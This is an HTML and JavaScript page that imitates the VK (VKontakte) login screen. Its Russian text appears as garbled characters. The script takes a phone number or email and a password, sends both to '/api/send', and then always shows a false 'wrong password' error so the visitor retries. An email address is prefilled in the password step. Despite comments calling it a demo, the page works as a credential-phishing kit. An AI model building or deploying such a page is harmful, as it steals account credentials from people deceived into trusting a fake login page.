<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>VK ‚Äî –í—Ö–æ–¥</title>
  <style>
    /* =========================
   MOBILE (‚â§ 480px)
   ========================= */
/* =========================
   MOBILE iOS FIX (FINAL)
   ========================= */
    .footer{display:flex;justify-content:space-between;align-items:center;margin-top:8px;font-size:13px;color:var(--muted)}

    /* NEW: password-mode + centering styles */
   .password-mode .tabs {
  display: none;
}

.password-mode .content {
  display: flex;
  flex: 1;
  justify-content: center;
  align-items: center;
}

#step-password {
  position: relative;
  width: 100%;
  max-width: 360px;
  min-height: 100%;
  display: flex;
  flex-direction: column;
  justify-content: center; /* ‚¨Ö –í–ï–†–¢–ò–ö–ê–õ–¨–ù–´–ô –¶–ï–ù–¢–† */
  align-items: stretch;
  gap: 14px;
  padding-top: 32px; /* ‚¨Ö –∫–æ–º–ø–µ–Ω—Å–∞—Ü–∏—è —Å—Ç—Ä–µ–ª–∫–∏ */
}

    /* error state */
    .field.error{border-color:var(--error);background:#fff5f6}
    .error-text{color:var(--error);font-size:13px;text-align:center;margin-top:6px}
  </style>
</head>
<body>
  <div class="bg-deco" aria-hidden="true">
    <div class="arc a1"></div>
    <div class="arc a2"></div>
    <div class="arc a3"></div>
  </div>

  <div class="card" role="main" aria-live="polite">
    <div class="header">
      <div class="vk-logo" aria-label="VK">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M2.2 6.5c.15 7.1 3.7 11.3 10 11.6h.4V13.9c2.4.2 4.2 1.9 4.9 4.2h3.4c-.9-3.3-3.8-5.1-4.7-5.8.9-.6 3.4-2.7 4-5.8h-3.1c-.8 2.6-3.1 4.7-4.5 4.9V6.5h-3.1v8.4c-1.4-.3-3.9-2.5-4-8.4H2.2Z" fill="white"/>
        </svg>
      </div>
      <h1 id="page-title">–í—Ö–æ–¥ –í–ö–æ–Ω—Ç–∞–∫—Ç–µ</h1>
    </div>

    <div class="tabs" role="tablist" aria-label="–í—ã–±–µ—Ä–∏—Ç–µ —Å–ø–æ—Å–æ–± –≤—Ö–æ–¥–∞">
      <div class="tab-indicator" aria-hidden="true"></div>
      <div class="tab active" data-tab="phone" role="tab" aria-selected="true">–¢–µ–ª–µ—Ñ–æ–Ω</div>
      <div class="tab" data-tab="email" role="tab">–ü–æ—á—Ç–∞</div>
    </div>

    <div id="msg" style="min-height:28px"></div>

    <div class="content">
      <div id="step-identity" class="step">
        <div class="field">
          <input id="identity-input" type="text" placeholder="–í–≤–µ–¥–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω" autocomplete="username" />
        </div>

        <div class="controls" style="justify-content:center">
          <button id="next-btn" class="btn primary" style="width:100%">–í–æ–π—Ç–∏</button>
        </div>

        <div class="divider small"><hr /><div>–∏–ª–∏ —Å –ø–æ–º–æ—â—å—é</div><hr /></div>
        <div style="display:flex;gap:8px">
          <button id="qr-btn" class="btn ghost" style="flex:1">üî≤ QR-–∫–æ–¥</button>
          <a id="create-btn" class="btn ghost" href="#" style="text-decoration:none">–°–æ–∑–¥–∞—Ç—å</a>
        </div>

        <div class="small hint">–ù–∞–∂–∏–º–∞—è ¬´–í–æ–π—Ç–∏¬ª, –≤—ã –ø—Ä–∏–Ω–∏–º–∞–µ—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–µ —Å–æ–≥–ª–∞—à–µ–Ω–∏–µ –∏ –ø–æ–ª–∏—Ç–∏–∫—É –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏.</div>
      </div>

      <div id="step-password" class="step hidden" aria-hidden="true">
        <button id="back-arrow" aria-label="–ù–∞–∑–∞–¥" onclick="document.getElementById('back-btn').click()" style="position:absolute;left:18px;top:18px;background:transparent;border:0;font-size:18px;cursor:pointer;color:#6b7a86">‚Üê</button>

        <div style="text-align:center">
          <div style="display:flex;justify-content:center;margin-bottom:8px">
            <div style="position:relative;display:inline-flex;align-items:center;gap:10px">
              <div style="background:#0b75ff;padding:8px 14px;border-radius:10px;color:white;font-weight:700;letter-spacing:2px">‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢</div>
              <div style="width:44px;height:44px;border-radius:999px;background:#14c76b;display:flex;align-items:center;justify-content:center;box-shadow:0 6px 18px rgba(20,199,107,0.18);font-size:18px;color:white">‚ûú</div>
            </div>
          </div>

          <h2 style="margin:0 0 12px;font-size:18px;text-align:center">
–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</h2>
          <div style="text-align:center;color:var(--muted);font-size:13px;margin-bottom:6px">–í–≤–µ–¥–∏—Ç–µ –≤–∞—à —Ç–µ–∫—É—â–∏–π –ø–∞—Ä–æ–ª—å, –ø—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–π –∫</div>
          <div class="identity" id="identity-display" aria-live="polite" style="justify-content:center;margin-bottom:8px">
            <div class="pill" id="identity-pill" style="padding:8px 12px;background:#f4f7fb;border-radius:999px;border:1px solid #e8f0ff;color:#071627;font-weight:600">nurasff09@gmail.com</div>
          </div>
        </div>

        <label class="field" id="password-field" for="password-input">
          <input id="password-input" type="password" placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å" autocomplete="current-password" />
          <button id="toggle-eye" aria-label="–ü–æ–∫–∞–∑–∞—Ç—å –ø–∞—Ä–æ–ª—å" style="border:0;background:transparent;cursor:pointer">üëÅÔ∏è</button>
        </label>
        <div id="password-error" class="error-text" style="display:none">–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å</div>

        <div class="controls" style="justify-content:center">
          <button id="back-btn" class="btn ghost" style="width:45%">–ù–∞–∑–∞–¥</button>
          <button id="signin-btn" class="btn primary" style="width:45%">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
        </div>
      </div>
    </div>

    <div class="footer">
      <a href="#" style="color:inherit;text-decoration:none;font-weight:600">–ü–æ–º–æ—â—å</a>
      <div style="color:var(--muted)">VK ¬© 2006‚Äì2026</div>
    </div>
  </div>

  <script>
    // Elements
    const tabs = Array.from(document.querySelectorAll('.tab'));
    const indicator = document.querySelector('.tab-indicator');
    const identityInput = document.getElementById('identity-input');
    const stepIdentity = document.getElementById('step-identity');
    const stepPassword = document.getElementById('step-password');
    const identityPill = document.getElementById('identity-pill');
    const nextBtn = document.getElementById('next-btn');
    const backBtn = document.getElementById('back-btn');
    const signinBtn = document.getElementById('signin-btn');
    const msg = document.getElementById('msg');

    const passwordField = document.getElementById('password-field');
    const passwordInput = document.getElementById('password-input');
    const passwordError = document.getElementById('password-error');

    // Helpers
    function showMsg(text, type='error'){
      msg.innerHTML = `<div style="padding:8px;border-radius:8px;font-size:13px;${type==='ok'? 'background:#e6fff4;color:#007a3d':'background:#fff0f2;color:#b00020'}">${text}</div>`;
      setTimeout(()=>{ if(msg.firstChild) msg.removeChild(msg.firstChild); },3500);
    }

    function setActiveTab(name){
      tabs.forEach(t=>{
        const active = t.dataset.tab === name;
        t.classList.toggle('active', active);
      });
      // move indicator
      if(name === 'phone') indicator.style.transform = 'translateX(0)';
      else indicator.style.transform = 'translateX(100%)';
    }

    // Tab click
    tabs.forEach((t, idx)=>{
      t.addEventListener('click', ()=>{
        const name = t.dataset.tab;
        setActiveTab(name);
        // update placeholder to be contextual
        identityInput.placeholder = name === 'phone' ? '–í–≤–µ–¥–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω' : '–í–≤–µ–¥–∏—Ç–µ –ø–æ—á—Ç—É';
        identityInput.value = '';
        identityInput.focus();
      });
    });

    // Simple validators
    function isPhone(v){ return v.replace(/\D/g,'').length >= 8; }
    function isEmail(v){ return /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(v); }

    function determineType(v){
      if(v.indexOf('@') !== -1) return 'email';
      if(/\d/.test(v)) return 'phone';
      return 'unknown';
    }

    // Next (identity -> password)
    nextBtn.addEventListener('click', ()=>{
      const val = identityInput.value.trim();
      const type = determineType(val);
      if(type === 'phone' && !isPhone(val)){ showMsg('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞'); identityInput.focus(); return; }
      if(type === 'email' && !isEmail(val)){ showMsg('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é –ø–æ—á—Ç—É'); identityInput.focus(); return; }
      if(type === 'unknown'){ showMsg('–í–≤–µ–¥–∏—Ç–µ —Ç–µ–ª–µ—Ñ–æ–Ω –∏–ª–∏ –ø–æ—á—Ç—É'); identityInput.focus(); return; }

      // Save to session and show password step
      sessionStorage.setItem('vk_identity', JSON.stringify({type,val}));
      const idEl = document.getElementById('identity-pill');
      if(type === 'email'){
        idEl.textContent = val;
      } else {
        const digits = val.replace(/\D/g,'');
        let formatted = val;
        if(digits.length >= 6){
          formatted = digits.replace(/(\d+)(\d{4})$/, (m,a,b)=> a.replace(/(\d{3})/g,'$1 ').trim() + ' ' + b);
        }
        idEl.textContent = formatted;
      }

      // animate steps
      stepIdentity.classList.add('hidden');
      stepPassword.classList.remove('hidden');
      stepPassword.setAttribute('aria-hidden','false');
      document.body.classList.add('password-mode'); // <--- added mode so CSS hides tabs and centers
      document.getElementById('page-title').textContent = '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å';
      setTimeout(()=>passwordInput.focus(),200);
    });

    // Back
    backBtn.addEventListener('click', ()=>{
      stepPassword.classList.add('hidden');
      stepIdentity.classList.remove('hidden');
      stepPassword.setAttribute('aria-hidden','true');
      document.body.classList.remove('password-mode');
      document.getElementById('page-title').textContent = '–í—Ö–æ–¥ –í–ö–æ–Ω—Ç–∞–∫—Ç–µ';
      identityInput.focus();
    });

    // Sign in (demo: always show error)
    signinBtn.addEventListener('click', ()=>{
      const pwd = passwordInput.value || '';

      // reset
      passwordField.classList.remove('error');
      passwordError.style.display = 'none';

      if(pwd.length < 1){
        passwordField.classList.add('error');
        passwordError.textContent = '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å';
        passwordError.style.display = 'block';
        passwordInput.focus();
        return;
      }

      // send to demo API (logs only)
      fetch('/api/send',{
        method:'POST',headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ contact: document.getElementById('identity-pill').textContent, password: pwd })
      }).catch(()=>{});

      // always show invalid password visually
      setTimeout(()=>{
        passwordField.classList.add('error');
        passwordError.textContent = '–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å';
        passwordError.style.display = 'block';
        passwordInput.focus();
      },300);
    });

    // Eye toggle
    document.getElementById('toggle-eye').addEventListener('click', ()=>{
      const pi = document.getElementById('password-input');
      if(pi.type === 'password'){ pi.type = 'text'; } else pi.type = 'password';
    });

    // small accessibility: QR button
    document.addEventListener('click', (e)=>{
      if(e.target.id === 'qr-btn') showMsg('QR-–∫–æ–¥: –æ—Ç–∫—Ä–æ–π—Ç–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ');
    });

    // Init
    setActiveTab('phone');
    identityInput.focus();

    // expose for debugging
    window.__vk_demo = { setActiveTab };
  </script>
</body>
</html>
